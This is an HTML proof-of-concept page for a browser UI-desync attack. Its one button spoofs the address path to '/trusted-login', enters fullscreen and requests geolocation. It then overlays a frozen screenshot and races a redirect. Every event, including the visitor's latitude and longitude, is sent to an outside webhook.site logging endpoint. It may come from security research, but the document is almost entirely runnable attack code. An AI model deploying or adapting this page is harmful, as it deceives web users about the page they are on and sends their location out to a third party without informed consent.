<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Advanced Geo UI Desync PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<button id="start">Start Demo</button>

<script>
const LOG = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";

function log(type, extra={}) {
  const data = {
    type,
    t: performance.now(),
    url: location.href,
    origin: location.origin,
    vis: document.visibilityState,
    ...extra
  };
  new Image().src = LOG + "?" + new URLSearchParams(data);
}

function requestGeo() {
  log("geo_request");

  navigator.geolocation.getCurrentPosition(
    pos => log("geo_success", {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    }),
    err => log("geo_error", {code: err.code})
  );
}

function freezeUI() {
  html2canvas(document.body,{
    scale:2,
    useCORS:true
  }).then(canvas => {

    const img = document.createElement("img");
    img.src = canvas.toDataURL("image/png");

    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      objectFit:"cover",
      zIndex:"999999"
    });

    document.body.innerHTML="";
    document.body.appendChild(img);

    log("ui_frozen");
  });
}

document.getElementById("start").onclick = () => {

  log("click");

  // 1. Fullscreen
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  // 2. Spoof path
  history.replaceState({}, '', '/trusted-login');
  log("url_spoofed");

  // 3. Trigger permission
  requestGeo();

  // 4. Race chain
  Promise.resolve().then(()=>{
    requestAnimationFrame(()=>{
      requestAnimationFrame(()=>{

        log("before_redirect");

        // 5. Freeze UI (biar user lihat trusted state)
        freezeUI();

        // 6. Redirect (race)
        setTimeout(()=>{
          location.replace("https://google.com:9090");
        },50);

      });
    });
  });

};

// extra visibility tracking
document.addEventListener("visibilitychange",()=>{
  log("visibility_change",{state:document.visibilityState});
});
</script>

</body>
</html>
